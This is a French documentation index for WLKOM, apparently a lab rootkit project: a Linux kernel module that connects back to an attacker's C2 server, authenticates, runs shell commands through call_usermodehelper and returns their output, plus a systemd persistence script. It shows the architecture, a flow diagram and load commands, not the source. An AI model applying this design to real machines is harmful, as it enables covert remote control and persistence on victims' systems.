# Code expliqué

Cette section documente le code source de WLKOM de façon narrative : pas des prototypes de fonctions listés en vrac, mais une explication de **ce qui se passe à l'intérieur de chaque bloc**, des choix faits, des pièges évités, et des conventions suivies.

L'objectif est que quelqu'un qui n'a jamais touché au projet puisse comprendre l'ensemble en lisant ces pages.

---

## Les composants et leurs rôles

WLKOM a trois composants distincts qui se coordonnent :

```
rootkit/wlkom.c          ← module kernel, côté victime
attacking_program/c2.c   ← serveur C2, côté attaquant
rootkit/install_persistence.sh  ← script d'installation systemd
```

Ils ne tournent pas sur la même machine, ni dans le même espace :

| Composant | Espace | Machine |
|---|---|---|
| `wlkom.c` | Kernel space | VM Victime |
| `c2.c` | User space | VM Attaquante |
| `install_persistence.sh` | User space (root) | VM Victime |

---

## Flux de fonctionnement

Voici ce qui se passe de bout en bout quand le système tourne correctement :

```
VM Attaquante                         VM Victime
─────────────                         ──────────
./c2 4444 test
  └─ écoute TCP:4444
  └─ attend connexion...
                                       insmod wlkom.ko password_hash=afd071e5
                                         └─ wlkom_init()
                                              └─ kthread_run(connection_thread)
                                                   │
                                                   ▼
                                              do_connect()
                                              └─ sock_create + kernel_connect
                                                     │
                    ◄──── connexion TCP ─────────────┘
  └─ [+] Rootkit connected
  └─ envoie AUTH afd071e5\n
                                              recv_line() → "AUTH afd071e5"
                                              authenticate_c2()
                                              └─ compare avec password_hash
                                              └─ OK → continue
  └─ [+] Authenticated
  └─ prompt c2_shell>
  └─ lit commande "uname -a"
  └─ envoie "uname -a\n"
                                              recv_line() → "uname -a"
                                              execute_and_send_output()
                                              └─ call_usermodehelper(/bin/sh -c '...')
                                              └─ lit /tmp/.wlkom_out
                                              └─ envoie résultat via kernel_sendmsg
  └─ affiche [Exit Status: 0]
  └─ affiche STDOUT / STDERR
```

---

## Pages de cette section

- **[wlkom.c](wlkom.md)** — Le module kernel, de l'initialisation à l'exécution de commandes. La partie la plus complexe du projet.
- **[c2.c](c2.md)** — Le serveur C2 en user space. Comparativement simple.
- **[install_persistence.sh](install-persistence.md)** — Le script d'installation du service systemd.
- **[Protocole réseau](protocol.md)** — Spécification du protocole de communication entre wlkom et c2.
